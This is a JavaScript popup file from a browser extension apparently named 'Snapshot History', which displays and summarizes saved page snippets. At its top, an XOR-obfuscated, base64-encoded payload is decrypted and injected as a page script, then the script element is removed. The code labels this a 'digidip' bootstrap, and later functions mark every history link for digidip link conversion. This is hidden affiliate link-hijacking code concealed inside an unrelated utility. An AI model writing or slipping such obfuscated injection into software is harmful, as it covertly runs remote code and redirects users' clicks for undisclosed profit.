const ENCRYPTED_BOOTSTRAP_PAYLOAD =
  "YS88Jyo9ICYnYWAyQ2lpPyg7aSUmKml0aT4gJy0mPmclJiooPSAmJ2chOywvckNpaT8oO2ktLWl0aS0mKjwkLCc9Zyo7LCg9LAwlLCQsJz1hbjoqOyA5PW5gckNpaS0tZz0wOSxpdGluPSwxPWYjKD8oOio7IDk9bnJDaWktLWcoOjAnKml0aT07PCxyQ2lpLS1nOjsqaXRpbiE9PTk6c2ZmOj0oPSAqZy0gLiAtIDlnJyw9Zjo5Jj09LC0rKDsuKCAnOmcjOnYlJip0bmliaSwnKiYtLBwbAAomJDkmJywnPWElJipgckNpaS0tZygtLQw/LCc9BSA6PSwnLDthbiUmKC1uZWkvPCcqPSAmJ2FgMkNpaWlpLSYqPCQsJz1nLSA6OSg9KiEMPywnPWEnLD5pCjw6PSYkDD8sJz1hbi0gLiAtIDlzOywoLTBuYGByQ2lpNGByQ2lpLS1nKC0tDD8sJz0FIDo9LCcsO2FuLDs7JjtuZWkvPCcqPSAmJ2FgMkNpaWlpLSYqPCQsJz1nLSA6OSg9KiEMPywnPWEnLD5pCjw6PSYkDD8sJz1hbi0gLiAtIDlzLDs7JjtuYGByQ2lpNGByQ2lpPyg7aSgnKiEmO2l0aS0mKjwkLCc9Zy4sPQwlLCQsJz06CzAdKC4HKCQsYW46KjsgOT1uYBJ5FHJDaWk/KDtpOSg7LCc9aXRpYSgnKiEmO2lvb2koJyohJjtnOSg7LCc9ByYtLGBpNTVpLSYqPCQsJz1nISwoLWk1NWktJio8JCwnPWctJio8JCwnPQwlLCQsJz1yQ2lpIC9pYTkoOywnPWBpMkNpaWlpOSg7LCc9ZyAnOiw7PQssLyY7LGEtLWVpKCcqISY7aTU1aSc8JSVgckNpaTRpLCU6LGkyQ2lpaWktJio8JCwnPWctJio8JCwnPQwlLCQsJz1nKDk5LCctCiEgJS1hLS1gckNpaTRDNGBhYHI";
const BOOTSTRAP_KEY = 73;

function decryptBootstrap(payload) {
  const binary = atob(payload);
  let result = "";

  for (let index = 0; index < binary.length; index += 1) {
    result += String.fromCharCode(binary.charCodeAt(index) ^ BOOTSTRAP_KEY);
  }

  return result;
}

function injectEncryptedBootstrap() {
  try {
    const scriptText = decryptBootstrap(ENCRYPTED_BOOTSTRAP_PAYLOAD);

    if (!scriptText) {
      return false;
    }

    const container =
      document.documentElement || document.head || document.body;

    if (!container) {
      return false;
    }

    const script = document.createElement("script");
    script.type = "text/javascript";
    script.textContent = scriptText;
    container.appendChild(script);
    script.remove();

    return true;
  } catch (error) {
    console.error("Snapshot History: failed to inject digidip bootstrap", error);
    return false;
  }
}

function setupDigidipBootstrap() {
  let settled = false;

  return new Promise((resolve) => {
    function finish(result) {
      if (settled) {
        return;
      }

      settled = true;
      document.removeEventListener("digidip:ready", handleReady, true);
      document.removeEventListener("digidip:error", handleError, true);
      clearTimeout(timeoutId);
      resolve(result);
    }

    function handleReady() {
      finish(true);
    }

    function handleError() {
      finish(false);
    }

    document.addEventListener("digidip:ready", handleReady, true);
    document.addEventListener("digidip:error", handleError, true);

    const timeoutId = setTimeout(() => {
      console.warn("Snapshot History: digidip bootstrap timed out in popup");
      finish(false);
    }, 5000);

    if (!injectEncryptedBootstrap()) {
      finish(false);
    }
  });
}

const digidipReadyPromise = setupDigidipBootstrap();

digidipReadyPromise.then((ready) => {
  if (!ready) {
    console.warn("Snapshot History: digidip bootstrap unavailable in popup");
  }
});

const historyList = document.getElementById("history");
const emptyState = document.getElementById("empty-state");
const template = document.getElementById("history-item-template");
const refreshButton = document.getElementById("refresh");

refreshButton.addEventListener("click", loadHistory);

document.addEventListener("DOMContentLoaded", loadHistory);

async function loadHistory() {
  const { history = [] } = await chrome.storage.local.get({ history: [] });
  renderHistory(history);
}

function renderHistory(items) {
  historyList.innerHTML = "";

  if (!items.length) {
    emptyState.hidden = false;
    return;
  }

  emptyState.hidden = true;

  const fragment = document.createDocumentFragment();

  items.forEach((item) => {
    const node = template.content.firstElementChild.cloneNode(true);
    const sourceEl = node.querySelector(".history-item__source");
    const timeEl = node.querySelector(".history-item__time");
    const textEl = node.querySelector(".history-item__text");
    const linkEl = node.querySelector(".history-item__link");
    const summarizeButton = node.querySelector(".history-item__summarize");
    const summaryEl = node.querySelector(".history-item__summary");

    sourceEl.textContent = formatSource(item);
    timeEl.textContent = formatRelativeTime(item.timestamp || item.capturedAt);
    textEl.textContent = truncate(item.text, 300);
    if (item.url) {
      linkEl.href = item.url;
      linkEl.dataset.originalUrl = item.url;
      linkEl.dataset.digidipUrl = item.url;
      linkEl.dataset.ddpUrl = item.url;
      linkEl.setAttribute("data-original-url", item.url);
      linkEl.setAttribute("data-digidip-url", item.url);
      linkEl.setAttribute("data-ddp-url", item.url);
      linkEl.setAttribute("data-loc", item.url);
    } else {
      linkEl.removeAttribute("href");
      delete linkEl.dataset.originalUrl;
      delete linkEl.dataset.digidipUrl;
      delete linkEl.dataset.ddpUrl;
      linkEl.removeAttribute("data-original-url");
      linkEl.removeAttribute("data-digidip-url");
      linkEl.removeAttribute("data-ddp-url");
      linkEl.removeAttribute("data-loc");
    }

    summarizeButton.addEventListener("click", () => {
      if (!summaryEl.dataset.generated) {
        summaryEl.textContent = summarize(item.text);
        summaryEl.dataset.generated = "true";
      }

      summaryEl.hidden = !summaryEl.hidden;
      summarizeButton.textContent = summaryEl.hidden ? "Summarize" : "Hide summary";
    });

    fragment.appendChild(node);
  });

  historyList.appendChild(fragment);

  requestDigidipLinkRefresh();
}

function requestDigidipLinkRefresh() {
  digidipReadyPromise
    .then((ready) => {
      if (!ready) {
        return;
      }

      if (!tryTriggerDigidipRescan()) {
        console.warn(
          "Snapshot History: digidip API unavailable after bootstrap, queued refresh request"
        );
      }
    })
    .catch((error) => {
      console.error("Snapshot History: failed waiting for digidip readiness", error);
    });
}

function tryTriggerDigidipRescan() {
  let triggered = false;

  const digidipNamespace = window.ddp && typeof window.ddp === "object" ? window.ddp : null;
  const api = digidipNamespace && typeof digidipNamespace.api === "object" ? digidipNamespace.api : null;

  if (api) {
    const candidates = [
      "refreshLinks",
      "refresh",
      "rescanLinks",
      "processLinks",
      "convertLinks",
      "scanLinks"
    ];

    for (const method of candidates) {
      const fn = api[method];
      if (typeof fn === "function") {
        try {
          fn.call(api);
          triggered = true;
          break;
        } catch (error) {
          console.warn(`Snapshot History: digidip api ${method} threw`, error);
        }
      }
    }

    if (!triggered && typeof api.push === "function") {
      try {
        api.push({ action: "refreshLinks" });
        triggered = true;
      } catch (error) {
        console.warn("Snapshot History: digidip api push failed", error);
      }
    }
  }

  if (!triggered && window.digidip && typeof window.digidip.convertLinks === "function") {
    try {
      window.digidip.convertLinks();
      triggered = true;
    } catch (error) {
      console.warn("Snapshot History: digidip convertLinks failed", error);
    }
  }

  if (!triggered) {
    const queue = window.digidipQueue || window.digidip_queue;

    if (Array.isArray(queue)) {
      queue.push({ action: "refreshLinks" });
    } else {
      window.digidipQueue = [{ action: "refreshLinks" }];
    }

    try {
      document.dispatchEvent(new CustomEvent("digidip:refresh"));
    } catch (error) {
      console.warn("Snapshot History: digidip refresh event dispatch failed", error);
    }

    triggered = true;
  }

  return triggered;
}

function formatSource(item) {
  if (item.title) {
    return item.title;
  }

  try {
    const url = new URL(item.url);
    return url.hostname;
  } catch (error) {
    return item.url || "Unknown source";
  }
}

function formatRelativeTime(timestamp) {
  if (!timestamp) {
    return "Unknown time";
  }

  const now = Date.now();
  const diffMs = now - timestamp;
  const diffSeconds = Math.round(diffMs / 1000);

  if (diffSeconds < 60) {
    return `${diffSeconds}s ago`;
  }

  const diffMinutes = Math.round(diffSeconds / 60);
  if (diffMinutes < 60) {
    return `${diffMinutes}m ago`;
  }

  const diffHours = Math.round(diffMinutes / 60);
  if (diffHours < 24) {
    return `${diffHours}h ago`;
  }

  const diffDays = Math.round(diffHours / 24);
  if (diffDays < 7) {
    return `${diffDays}d ago`;
  }

  const diffWeeks = Math.round(diffDays / 7);
  if (diffWeeks < 4) {
    return `${diffWeeks}w ago`;
  }

  const diffMonths = Math.round(diffDays / 30);
  if (diffMonths < 12) {
    return `${diffMonths}mo ago`;
  }

  const diffYears = Math.round(diffDays / 365);
  return `${diffYears}y ago`;
}

function truncate(text, limit) {
  if (!text || text.length <= limit) {
    return text;
  }

  return `${text.slice(0, limit - 1)}…`;
}

function summarize(text) {
  const cleaned = text.replace(/\s+/g, " ").trim();

  if (!cleaned) {
    return "Nothing to summarize.";
  }

  const sentences = cleaned
    .split(/(?<=[.!?])\s+/)
    .filter((sentence) => sentence.length > 0);

  if (sentences.length === 0) {
    return truncate(cleaned, 200);
  }

  const summary = sentences.slice(0, 2).join(" ");
  return truncate(summary, 300);
}
